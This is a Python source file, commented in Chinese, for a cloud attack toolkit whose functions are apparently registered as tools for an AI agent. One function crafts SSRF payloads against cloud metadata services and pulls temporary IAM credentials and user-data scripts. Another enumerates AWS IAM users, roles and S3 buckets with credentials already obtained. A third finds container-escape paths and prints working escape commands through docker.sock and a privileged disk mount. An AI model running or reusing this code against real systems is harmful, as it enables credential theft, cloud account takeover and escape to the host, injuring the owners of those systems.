"""云攻击工具集

覆盖:
1. SSRF 打云元数据 (AWS/Aliyun/腾讯云)
2. IAM 凭证提取和利用
3. S3/OSS bucket 枚举和读写
4. 容器逃逸检测
5. 云服务枚举
"""
import os
import json
import subprocess
import logging
import urllib.request
import urllib.parse
from config import config
from tools.base import register_tool, run_cmd

logger = logging.getLogger(__name__)


def _run(cmd, timeout=180):
    """执行命令（超时整组强杀，防子进程挂死）"""
    return run_cmd(cmd, timeout=timeout)


def _curl(url, timeout=15):
    """curl GET 请求"""
    return _run(["curl", "-s", "-m", str(timeout), url], timeout=timeout + 5)


# ── 云元数据端点 ──
METADATA_ENDPOINTS = {
    "aws": {
        "base": "http://169.254.169.254/latest",
        "iam_role": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "user_data": "http://169.254.169.254/latest/user-data",
        "hostname": "http://169.254.169.254/latest/meta-data/hostname",
        "local_ip": "http://169.254.169.254/latest/meta-data/local-ipv4",
    },
    "aliyun": {
        "base": "http://100.100.100.200",
        "ram_role": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "user_data": "http://100.100.100.200/latest/user-data",
        "hostname": "http://100.100.100.200/latest/meta-data/hostname",
        "instance_id": "http://100.100.100.200/latest/meta-data/instance-id",
    },
    "tencent": {
        "base": "http://metadata.tencentyun.com",
        "cam_role": "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/",
        "user_data": "http://metadata.tencentyun.com/latest/user-data",
        "instance_id": "http://metadata.tencentyun.com/latest/meta-data/instance-id",
    },
    "gcp": {
        "base": "http://metadata.google.internal",
        "service_account": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "project": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    },
    "azure": {
        "base": "http://169.254.169.254",
        "token": "http://169.254.169.254/metadata/identity/oauth2/token",
    },
}


@register_tool(
    name="ssrf_metadata",
    description="""SSRF 打云元数据，提取 IAM 凭证。

支持云厂商:
- aws: 169.254.169.254 (IMDSv1)
- aliyun: 100.100.100.200
- tencent: metadata.tencentyun.com
- gcp: metadata.google.internal
- azure: 169.254.169.254

使用方式:
1. 如果有 SSRF 漏洞，传入 ssrf_url 参数，工具会指导你构造 payload
2. 如果已经在云主机上，直接指定 cloud 参数，自动拉取元数据

输出: IAM 角色名、临时 AccessKey/SecretToken、用户数据脚本等。
""",
    parameters={
        "type": "object",
        "properties": {
            "cloud": {
                "type": "string",
                "enum": ["aws", "aliyun", "tencent", "gcp", "azure"],
                "description": "云厂商",
            },
            "ssrf_url": {
                "type": "string",
                "description": "如果有 SSRF 漏洞，传入目标 URL（含参数），工具会生成元数据访问 payload",
            },
        },
    },
)
def ssrf_metadata(cloud: str = "aws", ssrf_url: str = "") -> str:
    """SSRF 打云元数据"""
    if cloud not in METADATA_ENDPOINTS:
        return f"[错误] 不支持的云厂商: {cloud}"

    endpoints = METADATA_ENDPOINTS[cloud]
    results = [f"☁️ 云元数据提取 ({cloud})"]

    # 如果是 SSRF 场景，生成 payload
    if ssrf_url:
        results.append(f"\n[SSRF Payload 生成]")
        for name, url in endpoints.items():
            if name == "base":
                continue
            # 构造 SSRF payload
            if "?" in ssrf_url:
                payload = ssrf_url + f"&url={urllib.parse.quote(url)}"
            else:
                payload = ssrf_url + f"?url={urllib.parse.quote(url)}"
            results.append(f"  {name}: {payload}")
        results.append(f"\n💡 手动测试: curl '{ssrf_url}&url={endpoints.get('iam_role') or endpoints.get('ram_role') or endpoints.get('cam_role')}'")
        return "\n".join(results)

    # 直接访问元数据（在云主机上）
    # 尝试获取 IAM 角色名
    role_key = {
        "aws": "iam_role", "aliyun": "ram_role",
        "tencent": "cam_role", "gcp": "service_account",
    }.get(cloud)

    if role_key:
        role_url = endpoints[role_key]
        r = _curl(role_url)
        if r and "[无输出]" not in r and "error" not in r.lower():
            results.append(f"\n🎯 [发现 IAM 角色]")
            roles = [line.strip() for line in r.split("\n") if line.strip()]
            for role in roles[:5]:
                results.append(f"  • {role}")

            # 尝试获取临时凭证
            for role in roles[:1]:  # 只取第一个角色
                if cloud == "aws":
                    cred_url = f"{role_url}{role}"
                elif cloud == "aliyun":
                    cred_url = f"{role_url}{role}"
                elif cloud == "tencent":
                    cred_url = f"{role_url}{role}"
                else:
                    break

                r2 = _curl(cred_url)
                if r2 and "{" in r2:
                    results.append(f"\n🔑 [IAM 临时凭证]")
                    try:
                        creds = json.loads(r2)
                        for k, v in creds.items():
                            if "Key" in k or "Token" in k or "Secret" in k:
                                results.append(f"  {k}: {v[:20]}...{v[-10:] if len(v) > 30 else v}")
                            else:
                                results.append(f"  {k}: {v}")
                    except json.JSONDecodeError:
                        results.append(f"  {r2[:500]}")

    # 尝试获取 user-data
    user_data_key = "user_data"
    if user_data_key in endpoints:
        r = _curl(endpoints[user_data_key])
        if r and "[无输出]" not in r and "<html" not in r.lower():
            results.append(f"\n📜 [user-data 脚本]")
            results.append(r[:1000])

    # 获取实例信息
    info_keys = ["hostname", "local_ip", "instance_id"]
    for key in info_keys:
        if key in endpoints:
            r = _curl(endpoints[key])
            if r and "[无输出]" not in r and len(r) < 200:
                results.append(f"\n[{key}]: {r}")

    return "\n".join(results)


@register_tool(
    name="aws_enum",
    description="""AWS 环境枚举和利用。

功能:
- whoami: 获取当前 IAM 身份
- s3_list: 列出所有 S3 bucket
- s3_read: 读取 S3 bucket 内容
- ec2_meta: 获取 EC2 实例元数据
- iam_enum: 枚举 IAM 用户和角色

需要: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY 环境变量
或已配置的 aws cli。

适合: 拿到 AWS 凭证后，枚举资源和提权。
""",
    parameters={
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": ["whoami", "s3_list", "s3_read", "ec2_meta", "iam_enum"],
                "description": "要执行的操作",
            },
            "bucket": {"type": "string", "description": "S3 bucket 名 (s3_read 用)"},
            "region": {"type": "string", "description": "AWS 区域，默认 us-east-1"},
        },
        "required": ["action"],
    },
)
def aws_enum(action: str, bucket: str = "", region: str = "us-east-1") -> str:
    """AWS 枚举"""
    results = [f"☁️ AWS 枚举: {action}"]

    if action == "whoami":
        r = _run(["aws", "sts", "get-caller-identity", "--output", "json"], timeout=30)
        if "{" in r:
            results.append(f"\n[当前身份]\n{r}")
        else:
            results.append(f"\n[未配置凭证或 aws cli 未安装]\n{r}")

    elif action == "s3_list":
        r = _run(["aws", "s3", "ls", "--output", "json"], timeout=30)
        results.append(f"\n[S3 Buckets]\n{r}")

    elif action == "s3_read" and bucket:
        r = _run(["aws", "s3", "ls", f"s3://{bucket}/", "--recursive"], timeout=60)
        results.append(f"\n[S3 Bucket 内容: {bucket}]\n{r}")

    elif action == "ec2_meta":
        # 直接从元数据服务获取
        endpoints = [
            ("hostname", "http://169.254.169.254/latest/meta-data/hostname"),
            ("local-ip", "http://169.254.169.254/latest/meta-data/local-ipv4"),
            ("instance-id", "http://169.254.169.254/latest/meta-data/instance-id"),
            ("instance-type", "http://169.254.169.254/latest/meta-data/instance-type"),
            ("iam-role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ]
        for name, url in endpoints:
            r = _curl(url)
            if r and "[无输出]" not in r:
                results.append(f"  {name}: {r[:200]}")

    elif action == "iam_enum":
        # 枚举 IAM 用户
        r = _run(["aws", "iam", "list-users", "--output", "json"], timeout=30)
        if "{" in r:
            results.append(f"\n[IAM 用户]\n{r[:2000]}")

        # 枚举角色
        r = _run(["aws", "iam", "list-roles", "--output", "json"], timeout=30)
        if "{" in r:
            results.append(f"\n[IAM 角色]\n{r[:2000]}")

    return "\n".join(results)


@register_tool(
    name="container_escape",
    description="""容器逃逸检测。检查当前环境是否在容器内，以及可能的逃逸路径。

检测:
1. 是否在容器内 (/.dockerenv, cgroup)
2. Docker socket 是否可访问
3. capabilities 是否危险 (CAP_SYS_ADMIN, CAP_SYS_PTRACE 等)
4. 是否可以访问宿主机文件系统
5. 内核漏洞检查 (dirty cow, dirty pipe 等)

输出: 检测到的逃逸路径和利用建议。

适合: 多阶段渗透中，拿到容器 shell 后尝试逃逸。
""",
    parameters={
        "type": "object",
        "properties": {},
    },
)
def container_escape() -> str:
    """容器逃逸检测"""
    results = ["🐳 容器逃逸检测"]

    # 1. 检测是否在容器内
    r = _run(["bash", "-c", "ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5"])
    if "docker" in r.lower() or "containerd" in r.lower():
        results.append("\n⚠️ [检测到容器环境]")
        results.append(f"  {r[:300]}")
    else:
        results.append("\n[未检测到容器环境标志]")

    # 2. Docker socket 检查
    r = _run(["bash", "-c", "ls -la /var/run/docker.sock 2>/dev/null"])
    if "docker.sock" in r:
        results.append("\n🎯 [Docker socket 可访问!]")
        results.append("  利用方式: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh")
        results.append(f"  {r[:200]}")

    # 3. Capabilities 检查
    r = _run(["bash", "-c", "cat /proc/1/status 2>/dev/null | grep -i cap"])
    if "Cap" in r:
        results.append(f"\n[Capabilities]\n{r[:500]}")
        # 解析 capabilities
        if "CapEff" in r:
            cap_line = [l for l in r.split("\n") if "CapEff" in l]
            if cap_line:
                cap_hex = cap_line[0].split(":")[1].strip()
                results.append(f"  CapEff: {cap_hex}")
                # 检查危险 capability
                dangerous_caps = {
                    21: "CAP_SYS_ADMIN",
                    19: "CAP_SYS_PTRACE",
                    24: "CAP_SYS_RESOURCE",
                    27: "CAP_MKNOD",
                    7: "CAP_SETUID",
                    8: "CAP_SETGID",
                }
                try:
                    cap_val = int(cap_hex, 16)
                    for bit, name in dangerous_caps.items():
                        if cap_val & (1 << bit):
                            results.append(f"  ⚠️ {name} 已启用")
                except ValueError:
                    pass

    # 4. 宿主机文件系统检查
    r = _run(["bash", "-c", "ls /host 2>/dev/null; ls /hostos 2>/dev/null; mount | grep -E 'host|/dev/sd' | head -5"])
    if r and "[无输出]" not in r:
        results.append(f"\n🎯 [检测到宿主机文件系统挂载]")
        results.append(f"  {r[:300]}")

    # 5. 检查 privileged 模式
    r = _run(["bash", "-c", "fdisk -l 2>/dev/null | head -5; ls /dev/sd* 2>/dev/null"])
    if r and "[无输出]" not in r:
        results.append("\n🎯 [容器以 privileged 模式运行!]")
        results.append("  利用方式: mkdir /host; mount /dev/sda1 /host; chroot /host")
        results.append(f"  {r[:300]}")

    return "\n".join(results)
